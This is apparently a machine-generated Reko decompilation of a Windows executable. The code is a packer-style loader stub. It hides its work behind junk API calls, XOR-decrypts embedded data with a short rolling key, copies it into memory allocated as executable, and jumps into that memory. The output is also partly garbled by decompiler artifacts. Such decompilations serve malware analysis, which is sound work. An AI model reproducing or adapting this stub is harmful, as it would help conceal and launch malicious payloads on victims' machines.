// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 1310D000: Register word32 fn1310D000(Stack (ptr byte) dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack (ptr word32) dwArg10, Stack word32 dwArg14, Stack word32 dwArg18)
word32 fn1310D000(byte * dwArg04, word32 dwArg08, word32 dwArg0C, word32 * dwArg10, word32 dwArg14, word32 dwArg18)
{
	*dwArg10 = dwArg0C;
	LPCWSTR * esp_42 = fp - 0x28;
	word32 ebx_16 = dwArg14;
	uint32 eax_25 = (uint32) ((uint64) (uint32) dwArg14 /u 0x05);
	byte * dwArg08_110 = dwArg08 + dwArg14;
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		LPCWSTR * esp_65 = esp_42 - 0x04;
		*esp_65 = (LPCWSTR *) (WCHAR *) 0xB8000000;
		uint32 eax_67 = DPB(eax_25, AddAtomW(*esp_65), 0);
		byte al_69 = *dwArg08_110;
		*(esp_65 - 0x04) = (int32) wLoc1C + dwArg18;
		ebx_16 = (word32) **(esp_65 - 0x04);
		eax_25 = (int32) al_69 ^ ebx_16;
		*dwArg04 = (byte) eax_25;
		wLoc1C = (word16) ((word32) wLoc1C + 0x01);
		esp_42 = esp_65;
		if ((int32) wLoc1C == 0x05)
			wLoc1C = 0x00;
		dwArg04 = dwArg04 + 0x01;
		dwArg08_110 = dwArg08_110 + 0x01;
	}
	return ebx_16;
}

// 1310D0A9: Register Eq_83 Win32CrtStartup()
Eq_83 Win32CrtStartup()
{
	InitCommonControls();
	GetLastError();
	Eq_90 eax_17 = DPB(ImageList_DragEnter((struct HWND__ *) 0x00BD0000, 0x0AA00000, 616), AddAtomW((WCHAR *) 0x00080000), 0);
	word32 ecx_33 = ImageList_Draw((struct _IMAGELIST *) 0x00234000, 0x00460000, (struct HDC__ *) 0x40000000, 0x00023C00, 0x000D6000, 0x0003F400) + edx;
	struct Eq_122 * v11_40 = (ecx_33 ^ 0x800401F0) + 0x930CE14A;
	word32 esi_44 = v11_40->dw0000;
	ptr32 esp_426 = fp - 776;
	if ((ecx_33 ^ 0x800401F0) != 0x800401F0)
		esp_426 = fp - 0x030C;
	struct Eq_138 * esp_58 = esp_426 - 0x04;
	esp_58->t0000 = fp - 0x10;
	*(esp_58 - 0x04) = 0x04;
	*(esp_58 - 0x08) = fp - 0x023C;
	*(esp_58 - 0x0C) = fp - 0x023C;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	Eq_175 eax_80 = v11_40->t0004;
	esp_58->t0008 = fp - 0x0234;
	esp_58->t0004.u0 = 0x04;
	esp_58->t0000 = fp - 0x10;
	*(esp_58 - 0x04) = 0x04;
	*(esp_58 - 0x08) = fp - 0x025C;
	*(esp_58 - 0x0C) = fp - 600;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	ui32 esi_103 = v11_40->dw0008;
	esp_58->t0008 = fp - 0x0234;
	esp_58->t0004.u0 = 0x08;
	esp_58->t0000 = fp - 0x10;
	*(esp_58 - 0x04) = 0x04;
	*(esp_58 - 0x08) = fp - 0x1C;
	*(esp_58 - 0x0C) = fp - 0x14;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	word32 eax_135 = v11_40->dw000C;
	esp_58->t0008 = fp - 0x0234;
	esp_58->t0004.u0 = 0x0C;
	esp_58->t0000 = fp - 0x10;
	*(esp_58 - 0x04) = 0x04;
	*(esp_58 - 0x08) = fp - 0x28;
	*(esp_58 - 0x0C) = fp - 0x1C;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	Eq_295 dwLoc0248_169 = v11_40->t0010;
	esp_58->t0008 = fp - 0x0234;
	esp_58->t0004.u0 = 0x10;
	esp_58->t0000 = fp - 0x10;
	*(esp_58 - 0x04) = 0x04;
	*(esp_58 - 0x08) = fp - 600;
	*(esp_58 - 0x0C) = fp - 0x0248;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	esp_58->t0008.u0 = 0x40;
	esp_58->t0004.u0 = 0x3000;
	Eq_295 edx_198 = esi_103 * 0x08 + 0x0C;
	Mem214[esp_58 + 0x00:word32] = edx_198 + eax_80 + esi_44;
	*(esp_58 - 0x04) = (ecx_33 ^ 0x800401F0) - 0x800401F0;
	ui32 dwLoc024C_193 = 0x14;
	word32 * dwLoc24_196 = (char *) &v11_40->t0010 + 0x04;
	Eq_366 eax_219 = VirtualAlloc(*(esp_58 - 0x04), esp_58->t0000, esp_58->t0004, esp_58->t0008);
	byte * dwLoc0C_225 = (char *) edx_198 + (eax_135 + 0x13100000);
	Eq_295 dwLoc0264_229 = edx_198;
	ui32 dwLoc08_230 = 0x00;
	Eq_394 dwLoc18_231 = null;
	while (true)
	{
		ptr32 esp_249 = esp_426 - 0x08;
		if (0x01 == 0x00)
			break;
		if (dwLoc0264_229 == dwLoc0248_169)
		{
			ui32 edi_354 = dwLoc08_230 + 0x01;
			dwLoc08_230 = edi_354;
			if (edi_354 == esi_103)
				break;
			word32 edi_360 = *dwLoc24_196;
			*(esp_249 - 0x04) = fp - 0x0234;
			*(esp_249 - 0x08) = dwLoc024C_193;
			*(esp_249 - 0x0C) = fp - 0x10;
			*(esp_249 - 0x10) = 0x04;
			*(esp_249 - 0x14) = fp - 0x1C - dwLoc024C_193;
			*(esp_249 - 0x18) = fp - 0x1C;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			LPVOID * eax_390 = dwLoc24_196 + 0x01;
			dwLoc0248_169 = (Eq_295) *eax_390;
			*(esp_249 - 0x04) = fp - 0x0234;
			ui32 eax_387 = dwLoc024C_193 + 0x04;
			*(esp_249 - 0x08) = eax_387;
			*(esp_249 - 0x0C) = fp - 0x10;
			*(esp_249 - 0x10) = 0x04;
			*(esp_249 - 0x14) = fp - 0x0248 - eax_387;
			*(esp_249 - 0x18) = fp - 0x0248;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			dwLoc024C_193 = eax_387 + 0x04;
			dwLoc24_196 = (word32 *) ((char *) eax_390 + 0x04);
			dwLoc0264_229 = null;
			dwLoc0C_225 = edi_360 + 0x13100000;
		}
		Mem339[eax_219 + dwLoc18_231:byte] = Mem218[dwLoc0C_225 + 0x00:byte];
		dwLoc0C_225 = dwLoc0C_225 + 0x01;
		dwLoc18_231 = dwLoc18_231 + 0x01;
		dwLoc0264_229 = (Eq_295) ((char *) dwLoc0264_229 + 0x01);
	}
	*(esp_249 - 0x04) = fp - 0x0234;
	*(esp_249 - 0x08) = (LPVOID *) edx_198;
	*(esp_249 - 0x0C) = fp - 0x0238;
	*(esp_249 - 0x10) = (LPVOID *) eax_80;
	*(esp_249 - 0x14) = (LPVOID *) (eax_219 - edx_198);
	*(esp_249 - 0x18) = (LPVOID *) eax_219;
	word32 ebx_275 = fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(esp_249 - 0x04) = fp;
	*(esp_249 - 0x08) = fp - 0x0234;
	*(esp_249 - 0x0C) = (LPVOID *) eax_80;
	*(esp_249 - 0x10) = esi_44;
	*(esp_249 - 0x14) = (LPVOID *) eax_219;
	word32 edx_298 = eax_219 + eax_80;
	*(esp_249 - 0x18) = (LPVOID *) edx_298;
	ptr32 esp_302;
	word32 ebp_303;
	byte SCZO_304;
	word32 eax_305;
	word32 ecx_306;
	word32 edx_307;
	byte SZO_308;
	byte C_309;
	word32 esi_310;
	byte Z_311;
	word32 edi_312;
	word32 ebx_313;
	byte bl_314;
	(eax_219 + 0x0F50)();
	*(esp_302 - 0x04) = 0x00;
	ExitProcess(*(esp_302 - 0x04));
}

